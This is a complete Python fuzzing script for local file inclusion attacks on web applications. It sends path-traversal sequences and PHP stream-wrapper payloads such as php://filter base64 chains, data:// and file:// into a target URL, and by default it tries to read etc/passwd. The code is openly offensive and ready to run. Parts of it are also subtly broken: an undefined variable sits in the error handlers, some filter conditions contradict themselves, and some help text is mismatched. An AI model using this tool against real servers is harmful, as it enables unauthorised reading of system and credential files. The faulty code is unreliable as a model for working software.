import itertools
import requests
import sys
import getopt
import json
import base64
import time
import urllib3
import datetime
import math
import base64
from requests.auth import HTTPBasicAuth
from urllib.parse import urlparse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def banner(options):
	print("\n\t _     _____ ___") 
	print(" \t| |   |  ___|_ _|")
	print(" \t| |   | |_   | |") 
	print(" \t| |___|  _|  | |") 
	print(" \t|_____|_|   |___|")
	print("\n\n===============================================")
	print(f"URL...................: {options['url']}")
	print(f"Method................: {options['method']}")
	print(f"Headers...............: {options['headers']}")
	print(f"Delay.................: {options['delay']}")
	print(f"timeout...............: {options['timeout']}")
	print(f"depth.................: {options['depth']}")
	print(f"redirect..............: {options['redirect']}")
	print(f"Payload...............: {options['payload']}")
	print(f"Mode..................: {options['mode']}")
	if options['data'] is not None:
		print(f"data..............: {options['data']}")	
	if options['auth'] is not None:
		print(f"auth..............: {options['auth']}")
	if options['encode'] is not None:
		print(f"encode................: {options['encode']}")
	if options['proxy'] is not None:
		print(f"Proxy.............: {options['proxy']}")
	if options['cookies'] is not None:
		print(f"Cookies...............: {options['cookies']}")
	if len(options['mcode']) > 0:
		print(f"Matcher code..........: {', '.join(map(str,options['mcode']))}")
	if len(options['mlen']) > 0:
		print(f"Matcher length........: {', '.join(map(str,options['mlen']))}")
	if len(options['mword']) > 0:
		print(f"Matcher word..........: {', '.join(map(str,options['mword']))}")
	if len(options['hcode']) > 0:
		print(f"Hidden code...........: {', '.join(map(str,options['hcode']))}")
	if len(options['hlen']) > 0:
		print(f"Hidden length.........: {', '.join(map(str,options['hlen']))}")
	if len(options['hword']) > 0:
		print(f"Hidden word...........: {', '.join(map(str,options['hword']))}")
	print("==============================================\n\n")

	
def help():
	print("OPTIONS:")
	print("\t-h --help     Using help")
	print("\t-u --url      Target url")
	print("\t-X            Method (GET, POST, HEAD, OPTIONS, DELETE, PATCH) default:GET")
	print("\t-r            recursion default:False");
	print("\t-p            payload data default:etc/passwd")
	print("\t-H            Header \'{\"Key\": \"value\"}\'")
	print("\t-m --mode     mode lfi or wrapper default:lfi")
	print("\t-c --cookie   Cookie \'{\"Key\": \"value\"}\'")
	print("\t-d --data     Post data \'{\"Key\": \"value\"}\'")
	print("\t--delay       Delay in seconds between requests default:0")
	print("\t--proxy       Proxy URL SOCKS5 or HTTP or HTTPS \'{\"http\": \"http://127.0.0.1:8080\"}\'");
	print("\t--timeout     Request timeout in seconds. default:10")
	print("\t--auth        Auth basic \"admin&test\"")
	print("\t--enocde      Encode payload (base64 | urlencode | durlencode)")
	print("\t--depth       Depth of repetitions LFI default:5")
	print("\t--mc          Matcher response code (200,301,400-403)")
	print("\t--ml          Matcher response length content (456,1024,568-700)")
	print("\t--mw          Matcher response words text (root)")
	print("\t--hc          Hide response code (200,301,400-403)")
	print("\t--hl          Hide response length content (456,1024,568-700)")
	print("\t--hw          Hide response words text (root)")
	print("EXAMPLES:")
	print("\tlfi.py -u https://example.com/page=FUZZ --timeout 300 --mc 200,301,302 -r")
	print("\tlfi.py -u https://example.com/page=FUZZ --mw root -p admin.php")
	

def urlencode(data):
	table = "0123456789abcdef"
	enc = ""
	for pos in range(len(data)):
		if ord('a') <= ord(data[pos]) and ord(data[pos]) <= ord('z') or ord('A') <= ord(data[pos]) and ord(data[pos]) <= ord('Z') or ord('0') <= ord(data[pos]) and ord(data[pos]) <= ord('9'):
			enc += data[pos]
			pos += 1
		else:
			enc += '%'
			enc += table[ord(data[pos]) >> 4]
			enc += table[ord(data[pos]) & 15]
			pos += 1
	return enc
	


def make_payload(options, payload):
	url = ""
	if options['encode'] == 'urlencode':
		payload = urlencode(payload + options['payload'])
	elif options['encode'] == 'durlencode':
		payload = urlencode(urlencode(payload  + options['payload']))
	else:
		payload += options['payload']
	if options['url'].find('FUZZ') != -1:
		url = options['url'].replace('FUZZ', payload)
	else:
		return None
	return url, payload
	
	
def is_matcher_word(words, strings):
	for w in words:
		if w in strings:
			return True
	return False



def output(options, response, payload):
	if len(options['mcode']) == 0 and len(options['mlen']) == 0 and len(options['mword']) == 0 and len(options['hcode']) == 0 and len(options['hlen']) == 0 and len(options['hword']) == 0:
		print(f"[+] len: {len(response.text):5}     code: {response.status_code}     payload: {payload}")
	elif len(options['hcode']) > 0 and response.status_code not in options['hcode'] and len(options['hword']) == 0 and len(options['hlen']) == 0:
		print(f"[+] len: {len(response.text):5}     code: {response.status_code}     payload: {payload}")
	elif len(options['hcode']) > 0 and response.status_code not in options['hcode'] and len(options['hlen']) > 0 and len(response.text) in options['hlen'] and len(options['hword']) == 0:
		print(f"[+] len: {len(response.text):5}     code: {response.status_code}     payload: {payload}")
	elif len(options['hcode']) > 0 and response.status_code not in options['hcode'] and len(options['hword']) > 0 and is_matcher_word(options['hword'], response.text) == False and len(options['hlen']) == 0:
		print(f"[+] len: {len(response.text):5}     code: {response.status_code}     payload: {payload}")		
	elif len(options['hlen']) > 0 and len(response.text) in options['hlen'] and len(options['hword']) == 0 and len(options['hcode']) == 0:
		print(f"[+] len: {len(response.text):5}     code: {response.status_code}     payload: {payload}")
	elif len(options['hlen']) > 0 and len(response.text) in options['hlen'] and len(options['hcode']) > 0 and response.status_code not in options['hcode'] and len(options['hword']) == 0:
		print(f"[+] len: {len(response.text):5}     code: {response.status_code}     payload: {payload}")
	elif len(options['hlen']) > 0 and len(response.text) in options['hlen'] and len(options['hword']) > 0 and is_matcher_word(options['hword'], response.text) == False and len(options['hlen']) == 0:
		print(f"[+] len: {len(response.text):5}     code: {response.status_code}     payload: {payload}")		
	elif len(options['hword']) > 0 and is_matcher_word(options['hword'], response.text) == False and len(options['hcode']) == 0 and len(options['hlen']) == 0:
		print(f"[+] len: {len(response.text):5}     code: {response.status_code}     payload: {payload}")
	elif len(options['hword']) > 0 and is_matcher_word(options['hword'], response.text) == False and len(options['hcode']) > 0 and response.status_code not in options['hcode'] and len(options['hlen']) == 0:
		print(f"[+] len: {len(response.text):5}     code: {response.status_code}     payload: {payload}")
	elif len(options['hword']) > 0 and is_matcher_word(options['hword'], response.text) == False and len(options['hlen']) > 0 and len(response.text) not in options['hlen'] and len(options['hcode']) == 0:
		print(f"[+] len: {len(response.text):5}     code: {response.status_code}     payload: {payload}")

	
		

def fuzz_wrapper(options):
	list_wrapper = ["php://filter/convert.base64-encode/resource=",
					"php://filter/zlib.inflate/resource=",
					"php://filter/zlib.deflate/convert.base64-encode/resource=",
				   	"php://filter/string.toupper/string.rot13/string.tolower/resource=",
				   	"php://filter/read=string.toupper|string.rot13|string.tolower/resource=",
					"data://text/plain,",
					"glob://",
				   	"file://",
				   	"compress.zlib://"]
	for p in list_wrapper:
		try:
			url, payload = make_payload(options, p)				
			resp = requests.request(options['method'], url, headers=options['headers'], cookies=options['cookies'], data=options['data'], auth=options['auth'], proxies=options['proxy'], timeout=options['timeout'], allow_redirects=options['redirect'], verify=False)
			output(options, resp, payload)
			time.sleep(options['delay'])
		except KeyboardInterrupt:
			return False
		except requests.exceptions.ConnectTimeout:
			print(f"[-] ConnectTimeout: {opts['url']}")
		except requests.exceptions.Timeout:
			print(f"[-] Timeout: {opts['url']}")
		except requests.exceptions.ProxyError:
			print(f"[-] Failed to connect to the proxy: {opts['proxy']}")
		except requests.exceptions.ConnectionError:
			print(f"[-] Connect error: {opts['url']}")
	

def fuzz_lfi(options):	
	chars = ['\\', '..', './', '../', '/']
	print(f"Total requests: {int(math.pow(len(chars), options['depth']))}\n")
	for num in range(1, options['depth']):
		for payloads in itertools.product(chars, repeat=num):						
			try:
				url, payload = make_payload(options, ''.join(payloads))				
				resp = requests.request(options['method'], url, headers=options['headers'], cookies=options['cookies'], data=options['data'], auth=options['auth'], proxies=options['proxy'], timeout=options['timeout'], allow_redirects=options['redirect'], verify=False)
				output(options, resp, payload)
				time.sleep(options['delay'])
			except KeyboardInterrupt:
				return False
			except requests.exceptions.ConnectTimeout:
				print(f"[-] ConnectTimeout: {opts['url']}")
			except requests.exceptions.Timeout:
				print(f"[-] Timeout: {opts['url']}")
			except requests.exceptions.ProxyError:
				print(f"[-] Failed to connect to the proxy: {opts['proxy']}")
			except requests.exceptions.ConnectionError:
				print(f"[-] Connect error: {opts['url']}")
	return True
			

def parse_filter_int(value):
	code = list()
	for v in value.split(','):
		if v.find('-') != -1:
			code.append(range(int(v.split('-')[0]), int(v.split('-')[1]) + 1))
		else:
			code.append(int(v))
	return code
			
			
def main():
	options = { "url": None,
			   	"method": "GET",			   				  	
			  	"delay": 0,
			  	"timeout": 10,
			   	"depth": 5,
			   	"data": None,
			   	"encode": None,
			   	"auth": None,
			   	"proxy": None,
			   	"cookies": None,
			   	"redirect": False,
			   	"mcode": [],
			   	"mlen": [],
			   	"mword": [],
			   	"hcode": [],
			   	"hlen": [],
			   	"hword": [],
			   	"mode": "lfi",
			   	"payload": "etc/passwd",
			   	"headers": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:143.0) Gecko/20100101 Firefox/143.0", "Accept": "*/*", "Accept-Language": "*", "Accept-Encoding": "*"}}
	try:
		opts, args = getopt.getopt(sys.argv[1:], "hu:H:c:X:d:e:r:p:m:", ["help", "url=", "delay=", "timeout=", "cookie=", "data=", "depth=", "encode=", "auth=", "proxy=", "mc=", "ml=", "mw=", "hc=", "hl=", "hw=", "mode="])
	except getopt.GetoptError as e:
		print(e)
		sys.exit(2)
	for opt, arg in opts:
		if opt == '-h' or opt == '--help':
			help()
			exit(0)
		elif opt == '-u' or opt == '--url':
			options['url'] = arg
		elif opt == '-H':
			options['headers'].update(json.loads(arg))
		elif opt == '--delay':
			options['delay'] = int(arg)
		elif opt == '--timeout':
			options['timeout'] = int(arg)
		elif opt == '-c' or opt == '--cookie':
			options['cookies'] = json.loads(arg)
		elif opt == '-X':
			options['method'] = arg.upper()
		elif opt == '-p':
		  	options['payload'] = arg
		elif opt == '-d' or opt == '--data':
			options['data'] = arg
		elif opt == '--depth':
			options['depth'] = int(arg)
		elif opt == '-e' or opt == '--encode':
			options['encode'] = arg
		elif opt == '--auth':
			options['auth'] = HTTPBasicAuth(arg.split('&')[0], arg.split('&')[1])
		elif opt == '--proxy':
			options['proxy'] = json.loads(arg)
		elif opt == '-r':
			options['redirect'] = True
		elif opt == '--mc':
			options['mcode'] += parse_filter_int(arg)
		elif opt == '--ml':
			options['mlen'] += parse_filter_int(arg)
		elif opt == '--mw':
			options['mword'] += arg.split(',')
		elif opt == '--hc':
			options['hcode'] += parse_filter_int(arg)
		elif opt == '--hl':
			options['hlen'] += parse_filter_int(arg)
		elif opt == '--hw':
			options['hword'] += arg.split(',')
			print(options['hword'])
		elif opt == '-m' or opt == '--mode':
			options['mode'] = arg
			
	banner(options)
	start = datetime.datetime.now()
	print(f"Start time: {start.hour}:{start.minute}:{start.second}\n")
	if options['mode'] == 'lfi':
		fuzz_lfi(options)
	elif options['mode'] == 'wrapper':
		fuzz_wrapper(options)
	else:
		print("[-] Invalid mode")
	end = datetime.datetime.now()
	print(f"\nEnd time: {end.hour}:{end.minute}:{end.second}\n")
	
	
if __name__ == '__main__':
	main()
